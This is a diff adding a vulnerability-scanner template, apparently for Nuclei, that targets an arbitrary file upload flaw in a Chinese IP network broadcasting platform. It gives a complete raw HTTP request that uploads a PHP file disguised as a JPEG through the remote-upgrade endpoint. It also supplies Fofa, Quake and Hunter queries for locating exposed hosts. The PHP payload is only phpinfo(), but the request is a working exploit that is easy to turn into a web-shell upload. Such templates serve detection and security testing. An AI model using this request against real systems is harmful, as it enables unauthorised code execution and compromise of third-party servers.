@@ -1,0 +1,45 @@
+id: Itc_IP_Network_Broadcasting_Fileupload
+
+info:
+  name: Itc_IP_Network_Broadcasting_Fileupload
+  author: HK
+  severity: critical
+  description: IP网络广播服务平台存在任意文件上传漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: icon_hash="-568806419"
+    Quake-query: favicon= "9091011a03bffd9898d79fc589a2c65d"
+    Hunter-query: web.icon=="9091011a03bffd9898d79fc589a2c65d"
+    verified: true
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /api/v2/remote-upgrade/upload HTTP/1.1
+    Host: {{Hostname}}
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    Origin: http://127.0.0.1
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytiZYyyKkbwCxtHC1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Referer: http://127.0.0.1/api/v2/remote-upgrade/upload
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+    Connection: close
+    Content-Length: 195
+
+    ------WebKitFormBoundarytiZYyyKkbwCxtHC1
+    Content-Disposition: form-data; name="file"; filename="1.php"
+    Content-Type: image/jpeg
+
+    <?php phpinfo();?>
+    ------WebKitFormBoundarytiZYyyKkbwCxtHC1--
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - relative_path
